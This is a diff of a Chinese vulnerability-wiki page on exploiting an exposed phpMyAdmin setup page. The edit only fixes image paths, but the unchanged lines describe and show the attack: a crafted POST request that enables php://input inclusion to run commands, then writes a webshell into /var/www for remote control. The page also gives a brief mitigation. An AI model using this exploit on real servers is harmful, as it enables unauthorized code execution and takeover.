@@ -15,7 +15,7 @@ phpMyAdmin
 三、复现过程
 ------------
 
-如果用户未对phpmyadmin目录下的setup文件进行安全处理,那普通用户可以在不进行身份认证的情况下,便可以配置服务器信息(防范措施:不允许其他用户从公网访问phpMyAdmin目录或者禁止访问setup文件)![1.png](/Users/aresx/Documents/VulWiki/.resource/Phpmyadminsetup页面配置不当的利用姿势整合/media/rId24.png)我们可以通过构造参数执行配置指令,并利用php伪协议提交post内容执行
+如果用户未对phpmyadmin目录下的setup文件进行安全处理,那普通用户可以在不进行身份认证的情况下,便可以配置服务器信息(防范措施:不允许其他用户从公网访问phpMyAdmin目录或者禁止访问setup文件)![1.png](./.resource/Phpmyadminsetup页面配置不当的利用姿势整合/media/rId24.png)我们可以通过构造参数执行配置指令,并利用php伪协议提交post内容执行
 
     POST http://www.0-sec.org/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1      
      #问号及其后面的内容用于修改修改php的主配置文件php.ini，从而可以执行下面插入的php代码
@@ -35,7 +35,7 @@ phpMyAdmin
 
     ?>
 
-可以使用Burpsuite的Repeater工具该发送post请求,获取目标的信息![3.png](/Users/aresx/Documents/VulWiki/.resource/Phpmyadminsetup页面配置不当的利用姿势整合/media/rId25.png)由刚刚的id命令得知目前的用户为www-data,由查看账户信息得知其主目录为/var/www,那么便可以向其主目录写入木马,以实现远程控制的效果![4.png](/Users/aresx/Documents/VulWiki/.resource/Phpmyadminsetup页面配置不当的利用姿势整合/media/rId26.png)![5.png](/Users/aresx/Documents/VulWiki/.resource/Phpmyadminsetup页面配置不当的利用姿势整合/media/rId27.png)命令如下
+可以使用Burpsuite的Repeater工具该发送post请求,获取目标的信息![3.png](./.resource/Phpmyadminsetup页面配置不当的利用姿势整合/media/rId25.png)由刚刚的id命令得知目前的用户为www-data,由查看账户信息得知其主目录为/var/www,那么便可以向其主目录写入木马,以实现远程控制的效果![4.png](./.resource/Phpmyadminsetup页面配置不当的利用姿势整合/media/rId26.png)![5.png](./.resource/Phpmyadminsetup页面配置不当的利用姿势整合/media/rId27.png)命令如下
 
     POST http://www.0-sec.org/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
     Host: www.0-sec.org
@@ -50,7 +50,7 @@ phpMyAdmin
 
     ?>
 
-通过在浏览器访问该木马,便可获取目标系统的shell![6.png](/Users/aresx/Documents/VulWiki/.resource/Phpmyadminsetup页面配置不当的利用姿势整合/media/rId28.png)
+通过在浏览器访问该木马,便可获取目标系统的shell![6.png](./.resource/Phpmyadminsetup页面配置不当的利用姿势整合/media/rId28.png)
 
 参考链接
 --------
